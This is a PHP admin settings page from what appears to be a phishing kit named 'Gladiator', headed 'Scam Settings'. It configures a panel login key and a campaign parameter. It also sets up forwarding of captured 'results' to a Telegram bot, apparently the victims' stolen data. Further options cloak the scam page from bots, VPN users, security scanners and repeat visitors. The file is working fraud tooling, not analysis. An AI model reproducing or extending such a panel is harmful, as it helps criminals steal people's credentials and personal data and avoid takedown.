<?php
session_start();
error_reporting(0);
if (!isset($_SESSION['logged_in'])) {
    header('location: login');
    die();
}
// Path to the settings configuration file
$settingsFile = "../config/settings.ini";

// Parse the settings from the ini file
$settings = parse_ini_file($settingsFile);

// Check if the form is submitted via POST method
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['save'])) {
    
    // Sanitize and validate form inputs
    $settings['keypanel']       = htmlspecialchars($_POST['KeyPanel']);
    $settings['site_param_on']  = htmlspecialchars($_POST['siteParamOn']);
    $settings['site_parameter'] = htmlspecialchars($_POST['siteParameter']);
    
    // Handle checkbox inputs (they are either checked or unchecked)
    $settings['resulttotele']  = isset($_POST['resulttotele']) ? 'on' : 'off';
    $settings['apiToken']       = htmlspecialchars($_POST['apiToken']);
    $settings['chatID']         = htmlspecialchars($_POST['chatID']);
    $settings['stopbot']        = isset($_POST['stopbot']) ? 'on' : 'off';
    $settings['stopbot_key']    = htmlspecialchars($_POST['stopbot_key']);
    $settings['ipq_key']        = htmlspecialchars($_POST['ipq_key']);
    
    // Handle checkbox inputs (they are either checked or unchecked)
    $settings['lock_platform']  = isset($_POST['lock_platform']) ? 'on' : 'off';
    $settings['block_vpn']      = isset($_POST['block_vpn']) ? 'on' : 'off';
    $settings['block_ua']       = isset($_POST['block_ua']) ? 'on' : 'off';
    $settings['block_iprange']  = isset($_POST['block_iprange']) ? 'on' : 'off';
    $settings['onetime']        = isset($_POST['onetime']) ? 'on' : 'off';

    // Prepare the updated configuration data to write back to the settings.ini file
    $configData = '';
    foreach ($settings as $key => $value) {
        $configData .= "{$key} = \"{$value}\"\n";
    }

    // Save the updated settings back to the settings.ini file
    file_put_contents($settingsFile, $configData);

    // Set success message for SweetAlert
    $_SESSION['message'] = 'Settings updated successfully!';
    $_SESSION['message_type'] = 'success'; // You can use 'error' for error messages
    header("Location: /admin/settings");
    exit();
}
?>
<!DOCTYPE html>
<html lang="en" data-layout="vertical" data-topbar="light" data-sidebar="dark" data-sidebar-size="lg" data-sidebar-image="none" data-preloader="disable" data-theme="default" data-theme-colors="default">
<head>
    <meta charset="utf-8" />
    <title>Settings | Gladiator</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta content="Settings Gladiator" name="description" />
    <meta content="Gladiator" name="author" />
    <!-- App favicon -->
    <link rel="shortcut icon" href="assets/img/favicon.ico">
    <!-- Layout config Js -->
    <script src="assets/js/layout.js"></script>
    <!-- Bootstrap Css -->
    <link href="assets/css/bootstrap.min.css" rel="stylesheet" type="text/css" />
    <!-- Icons Css -->
    <link href="assets/css/icons.min.css" rel="stylesheet" type="text/css" />
    <!-- App Css-->
    <link href="assets/css/app.min.css" rel="stylesheet" type="text/css" />
    <!-- custom Css-->
    <link href="assets/css/custom.min.css" rel="stylesheet" type="text/css" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css">
    <!-- Data Tables CSS -->
    <link href="assets/css/dataTables.bootstrap5.css" rel="stylesheet" />
	<link href="assets/css/buttons.bootstrap5.min.css"  rel="stylesheet">
	<link href="assets/css/responsive.bootstrap5.css" rel="stylesheet" />
</head>
<body>
    <div id="layout-wrapper">
        <?php require 'header.php'; ?>
        <?php require 'navbar.php'; ?>
        <!-- Vertical Overlay-->
        <div class="vertical-overlay"></div>
        <!-- ============================================================== -->
        <!-- Start right Content here -->
        <!-- ============================================================== -->
        <div class="main-content">
            <div class="page-content">
                <div class="container-fluid">
                    <div class="row">
                        <div class="col-12">
                            <div class="page-title-box d-sm-flex align-items-center justify-content-between bg-galaxy-transparent">
                                <h4 class="mb-sm-0">Scam Settings</h4>
                                <div class="page-title-right">
                                    <ol class="breadcrumb m-0">
                                        <li class="breadcrumb-item">
                                            <a href="javascript: void(0);">Scam Settings</a>
                                        </li>
                                    </ol>
                                </div>
                            </div>
                        </div>
                    </div>
                    <?php if (isset($_SESSION['message_type'])): ?>
                    <div class="alert alert-success alert-dismissible alert-label-icon rounded-label fade show material-shadow" role="alert">
                        <i class="ri-check-double-line label-icon"></i><strong>Success</strong> - <?= $_SESSION['message']; ?>
                        <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
                    </div>
                    <?php unset($_SESSION['message']); unset($_SESSION['message_type']); ?>
                    <?php endif ?>
                    <form method="POST" action="">
                        <div class="row">
                            <div class="col-sm-6">
                                <div class="card">
                                    <div class="card-body">
                                        <h6>Scam Configuration</h6>
                                        <div class="row mb-3">
                                            <div class="col-lg-3">
                                                <label for="KeyPanel">Key To Login</label>
                                            </div>
                                            <div class="col-lg-9">
                                                <div class="position-relative auth-pass-inputgroup">
                                                    <input type="password" id="password-input" name="KeyPanel" value="<?php echo $settings['keypanel']; ?>" class="form-control pe-5 password-input" required>
                                                    <button class="btn btn-link position-absolute end-0 top-0 text-decoration-none text-muted password-addon material-shadow-none" type="button" id="password-addon"><i class="ri-eye-fill align-middle"></i></button>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="row mb-3">
                                            <div class="col-lg-3">
                                                <label for="siteParamOn">Use Parameter</label>
                                            </div>
                                            <div class="col-lg-9">
                                                <select class="form-control" name="siteParamOn" id="validation" required>
                                                    <option <?php if (isset($settings['site_param_on']) && $settings['site_param_on'] == 'off') {
                                                            echo "selected=selected";
                                                    } ?> value="off">OFF</option>
                                                    <option <?php if (isset($settings['site_param_on']) && $settings['site_param_on'] == 'on') {
                                                        echo "selected=selected";
                                                    } ?> value="on">ON</option>
                                                </select>
                                            </div>
                                        </div>
                                        <div class="row mb-3">
                                            <div class="col-lg-3">
                                                <label for="siteParameter">Site Parameter</label>
                                            </div>
                                            <div class="col-lg-9">
                                                <input type="text" id="siteParameter" name="siteParameter" placeholder="ex: gladiator" value="<?php echo $settings['site_parameter']; ?>" class="form-control" required>
                                            </div>
                                        </div>
                                        <hr>
                                        <h6>Result Configuration</h6>
                                        <div class="form-check form-switch d-flex-inline">
                                            <input class="form-check-input" type="checkbox" name="resulttotele" id="resulttotele"
                                                <?php if (isset($settings['resulttotele']) && $settings['resulttotele'] == 'on') { echo "checked"; } ?>>
                                            <label class="form-check-label" for="resulttotele">
                                                Send Result To Telegram
                                            </label>
                                        </div>
                                        <div class="row mb-3">
                                            <div class="col-lg-3">
                                                <label for="apiToken">Telegram API Token</label>
                                            </div>
                                            <div class="col-lg-9">
                                                <input type="text" id="apiToken" name="apiToken" placeholder="Your BOT ID Telegram - ex: 123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11" value="<?php echo $settings['apiToken']; ?>" class="form-control" <?php if (!(isset($settings['resulttotele']) && $settings['resulttotele'] == 'on')) { echo 'readonly'; } ?>>
                                            </div>
                                        </div>
                                        <div class="row mb-3">
                                            <div class="col-lg-3">
                                                <label for="chatID">Telegram User ID</label>
                                            </div>
                                            <div class="col-lg-9">
                                                <input type="text" id="chatID" name="chatID" placeholder="Your ID Telegram - ex: xxxxxxxxxx ( 10 digits )" value="<?php echo $settings['chatID']; ?>" class="form-control" <?php if (!(isset($settings['resulttotele']) && $settings['resulttotele'] == 'on')) { echo 'readonly'; } ?>>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="col-sm-6">
                                <div class="card">
                                    <div class="card-body">
                                        <h6>Blocker API Key Configuration</h6>
                                        <div class="form-check form-switch d-flex-inline">
                                            <input class="form-check-input" type="checkbox" name="stopbot" id="stopbot"
                                                <?php if (isset($settings['stopbot']) && $settings['stopbot'] == 'on') { echo "checked"; } ?>>
                                            <label class="form-check-label" for="stopbot">
                                                Stopbot
                                            </label>
                                        </div>
                                        <div class="row mb-3">
                                            <div class="col-lg-3">
                                                <label for="Stopbot">Stopbot API Key</label>
                                            </div>
                                            <div class="col-lg-9">
                                                <input type="text" class="form-control" name="stopbot_key" value="<?php echo $settings['stopbot_key']; ?>" class="form-control" <?php if (!(isset($settings['stopbot']) && $settings['stopbot'] == 'on')) { echo 'readonly'; } ?>>
                                            </div>
                                        </div>
                                        <div class="row mb-3">
                                            <div class="col-lg-3">
                                                <label for="IPQ">IpQualityScore API Key</label>
                                            </div>
                                            <div class="col-lg-9">
                                                <input type="text" class="form-control" name="ipq_key" value="<?php echo $settings['ipq_key']; ?>">
                                            </div>
                                        </div>
                                        <hr>
                                        <h6>Blocker Configuration</h6>
                                        <div class="form-check form-switch d-flex-inline">
                                            <input class="form-check-input" type="checkbox" name="lock_platform" id="lock_platform"
                                                <?php if (isset($settings['lock_platform']) && $settings['lock_platform'] == 'on') { echo "checked"; } ?>>
                                            <label class="form-check-label" for="lock_platform">
                                                Lock Only Phone Device Access
                                            </label>
                                        </div>
                                        <div class="form-check form-switch d-flex-inline">
                                            <input class="form-check-input" type="checkbox" name="block_vpn" id="block_vpn"
                                                <?php if (isset($settings['block_vpn']) && $settings['block_vpn'] == 'on') { echo "checked"; } ?>>
                                            <label class="form-check-label" for="block_vpn">
                                                Block VPN
                                            </label>
                                        </div>
                                        <div class="form-check form-switch d-flex-inline">
                                            <input class="form-check-input" type="checkbox" name="block_ua" id="block_ua"
                                                <?php if (isset($settings['block_ua']) && $settings['block_ua'] == 'on') { echo "checked"; } ?>>
                                            <label class="form-check-label" for="block_ua">
                                                Block User Agent
                                            </label>
                                        </div>
                                        <div class="form-check form-switch d-flex-inline">
                                            <input class="form-check-input" type="checkbox" name="block_iprange" id="block_iprange"
                                                <?php if (isset($settings['block_iprange']) && $settings['block_iprange'] == 'on') { echo "checked"; } ?>>
                                            <label class="form-check-label" for="block_iprange">
                                                Block IP Ranges
                                            </label>
                                        </div>
                                        <div class="form-check form-switch d-flex-inline">
                                            <input class="form-check-input" type="checkbox" name="onetime" id="onetime"
                                                <?php if (isset($settings['onetime']) && $settings['onetime'] == 'on') { echo "checked"; } ?>>
                                            <label class="form-check-label" for="onetime">
                                                Block One-Time Access
                                            </label>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <button type="submit" class="btn btn-outline-primary" name="save">Update Settings</button>
                        <br><br>
                    </form>
                </div>
                <footer class="footer">
                    <div class="container-fluid">
                        <div class="row">
                            <div class="col-sm-6">
                                <script>document.write(new Date().getFullYear())</script> © Gladiator.
                            </div>
                            <div class="col-sm-6">
                                <div class="text-sm-end d-none d-sm-block">
                                    Design & Develop by Gladiator
                                </div>
                            </div>
                        </div>
                    </div>
                </footer>
            </div>
            <!-- end main content-->
        </div>
        <!-- END layout-wrapper -->
        <?php require 'footer.php'; ?>
        <!-- JAVASCRIPT -->
        <script src="assets/js/simplebar.min.js"></script>
        <script src="assets/js/waves.min.js"></script>
        <script src="assets/js/feather.min.js"></script>
        <script src="assets/js/lord-icon-2.1.0.js"></script>
        <script src="assets/js/plugins.js"></script>
        <script src="assets/js/jquery-3.6.0.min.js"></script>
        <!-- Data tables -->
        <script src="assets/js/jquery.dataTables.min.js"></script>
    	<script src="assets/js/dataTables.bootstrap5.js"></script>
    	<script src="assets/js/dataTables.responsive.min.js"></script>
    	<script src="assets/js/table-data.js"></script>
        <!-- Dashboard init -->
        <script src="assets/js/dashboard-analytics.init.js"></script>
        <!-- password-addon init -->
        <script src="assets/js/password-addon.init.js"></script>
        <!-- App js -->
        <script src="assets/js/app.js"></script>
        <script src="assets/js/functions.js"></script>
        <!-- Bootstrap JS (Make sure to include Popper.js for Bootstrap components to work) -->
        <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.js"></script>
    </body>
</html>